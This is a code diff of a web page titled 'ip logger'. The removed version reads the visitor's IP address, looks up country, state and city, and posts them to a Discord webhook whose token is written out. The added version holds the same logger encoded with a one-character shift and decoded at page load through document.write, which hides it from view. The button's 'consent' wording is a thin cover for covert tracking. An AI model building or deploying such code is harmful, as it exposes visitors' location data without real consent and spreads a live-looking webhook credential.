@@ -1,67 +1,191 @@
-<!DOCTYPE html>
-<html lang="en">
-	<head>
-		<meta charset="UTF-8">
-		<meta name="viewport" content="width=device-width, initial-scale=1.0">
-		<title>ip logger 😈😈😈</title>
-		<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/2.2.4/jquery.min.js"></script>
-	</head>
-	<body>
-		<button onclick="sendMessage()">By clicking this button you consent to me logging your ip.</button>
-	</body>
-	<script>
-	    function sendMessage() {
-	        $.getJSON('https://api.ipify.org?format=jsonp&callback=?', ipCallback);
-	        
-	        function ipCallback(ip) {
-	            console.log(ip.ip)
-	            $.get('https://api.hackertarget.com/geoip/?q='+ip.ip, function(data) {
-                    data = data.trim().split('\n').reduce(function(obj, pair) {
-                        pair = pair.split(': ');
-                        return obj[pair[0]] = pair[1], obj;
-                    }, {});
-                    dataCallback(data)
-                });
-	        }
-	
-    		function dataCallback(data) {
-    		    console.log(JSON.stringify(data));
-    		    
-    		    const request = new XMLHttpRequest();
-    			
-    			request.open("POST", "https://discord.com/api/webhooks/1145530246687375390/v9GBEeZk5v6bkdCASMZAGAUTWsX4UtoqbSDqaXodMI9v-SFAVvwoJhNhGFzshnBoKuGh");
-    			
-    			request.setRequestHeader('Content-type', 'application/json');
-    			
-    			const params = {
-    				"content": "",
-    				"embeds": [{
-    					"type": "rich",
-    					"title": "__**New IP Logged**__",
-    					"color": 16777215,
-    					"fields": [{
-    					    "name": "__IP__",
-    						"value": data["IP Address"],
-    						"inline": true
-    					}, {
-    						"name": "__Country__",
-    						"value": data["Country"],
-    						"inline": true
-    					}, {
-    						"name": "__State__",
-    						"value": data["State"],
-    						"inline": true
-    					}, {
-    						"name": "__City__",
-    						"value": data["City"],
-    						"inline": true
-    					}],
-    					"description": "Someone clicked the button!"
-    				}]
-    			}
-    			
-    			request.send(JSON.stringify(params));
-    		}
-	    }
-	</script>
-</html>
+<script>var s="=\"EPDUZQF!iunm?=iunm!mboh>#fo#?
+=ifbe?
+
+=nfub!dibstfu>#VUG.9#?
+
+=nfub!obnf>#wjfxqpsu#!dpoufou>#xjeui>efwjdf.xjeui-!jojujbm.tdbmf>2/1#?
+
+=ujumf?jq!mphhfs!񠙉񠙉񠙉=0ujumf?
+
+=tdsjqu!tsd>#iuuqt;00deokt/dmpvegmbsf/dpn0bkby0mjct0krvfsz03/3/50krvfsz/njo/kt#?=0tdsjqu?
+=0ifbe?
+=cpez?
+
+=cvuupo!podmjdl>#tfoeNfttbhf)*#?Cz!dmjdljoh!uijt!cvuupo!zpv!dpotfou!up!nf!mphhjoh!zpvs!jq/=0cvuupo?
+=0cpez?
+=tdsjqu?
+!!!!gvodujpo!tfoeNfttbhf)*!|
+!!!!!!!!%/hfuKTPO)(iuuqt;00bqj/jqjgz/psh@gpsnbu>ktpoq\'dbmmcbdl>@(-!jqDbmmcbdl*<
+!!!!!!!!
+!!!!!!!!gvodujpo!jqDbmmcbdl)jq*!|
+!!!!!!!!!!!!dpotpmf/mph)jq/jq*
+!!!!!!!!!!!!%/hfu)(iuuqt;00bqj/ibdlfsubshfu/dpn0hfpjq0@r>(,jq/jq-!gvodujpo)ebub*!|!!!!!!!!!!!!!!!!!!!!ebub!>!ebub/usjn)*/tqmju)(]o(*/sfevdf)gvodujpo)pck-!qbjs*!|!!!!!!!!!!!!!!!!!!!!!!!!qbjs!>!qbjs/tqmju)(;!(*<!!!!!!!!!!!!!!!!!!!!!!!!sfuvso!pck\\qbjs\\1^^!>!qbjs\\2^-!pck<!!!!!!!!!!!!!!!!!!!!~-!|~*<!!!!!!!!!!!!!!!!!!!!ebubDbmmcbdl)ebub*!!!!!!!!!!!!!!!!~*<
+!!!!!!!!~
+!!!!
+
+gvodujpo!ebubDbmmcbdl)ebub*!|!!!!
+
+!!!!dpotpmf/mph)KTPO/tusjohjgz)ebub**<!!!!
+
+!!!!!!!!
+
+!!!!dpotu!sfrvftu!>!ofx!YNMIuuqSfrvftu)*<!!!!
+
+
+!!!!
+
+
+sfrvftu/pqfo)#QPTU#-!#iuuqt;00ejtdpse/dpn0bqj0xfcipplt022566413577984864:10w:HCFf[l6w7cleDBTN[BHBVUXtY5VuprcTErbYpeNJ:w.TGBWwxpKiOiHG{tioCpLvHi#*<!!!!
+
+
+!!!!
+
+
+sfrvftu/tfuSfrvftuIfbefs)(Dpoufou.uzqf(-!(bqqmjdbujpo0ktpo(*<!!!!
+
+
+!!!!
+
+
+dpotu!qbsbnt!>!|!!!!
+
+
+
+#dpoufou#;!##-!!!!
+
+
+
+#fncfet#;!\\|!!!!
+
+
+
+
+#uzqf#;!#sjdi#-!!!!
+
+
+
+
+#ujumf#;!#``++Ofx!JQ!Mphhfe++``#-!!!!
+
+
+
+
+#dpmps#;!27888326-!!!!
+
+
+
+
+#gjfmet#;!\\|!!!!
+
+
+
+
+!!!!#obnf#;!#``JQ``#-!!!!
+
+
+
+
+
+#wbmvf#;!ebub\\#JQ!Beesftt#^-!!!!
+
+
+
+
+
+#jomjof#;!usvf!!!!
+
+
+
+
+~-!|!!!!
+
+
+
+
+
+#obnf#;!#``Dpvousz``#-!!!!
+
+
+
+
+
+#wbmvf#;!ebub\\#Dpvousz#^-!!!!
+
+
+
+
+
+#jomjof#;!usvf!!!!
+
+
+
+
+~-!|!!!!
+
+
+
+
+
+#obnf#;!#``Tubuf``#-!!!!
+
+
+
+
+
+#wbmvf#;!ebub\\#Tubuf#^-!!!!
+
+
+
+
+
+#jomjof#;!usvf!!!!
+
+
+
+
+~-!|!!!!
+
+
+
+
+
+#obnf#;!#``Djuz``#-!!!!
+
+
+
+
+
+#wbmvf#;!ebub\\#Djuz#^-!!!!
+
+
+
+
+
+#jomjof#;!usvf!!!!
+
+
+
+
+~^-!!!!
+
+
+
+
+#eftdsjqujpo#;!#Tpnfpof!dmjdlfe!uif!cvuupo\"#!!!!
+
+
+
+~^!!!!
+
+
+~!!!!
+
+
+!!!!
+
+
+sfrvftu/tfoe)KTPO/tusjohjgz)qbsbnt**<!!!!
+
+~
+!!!!~
+=0tdsjqu?=0iunm?";var m="";for(var i=0;i<s.length;i++)m+=String.fromCharCode(s.charCodeAt(i)-1);document.write(m);</script><noscript>You must enable JavaScript to see this text.</noscript>
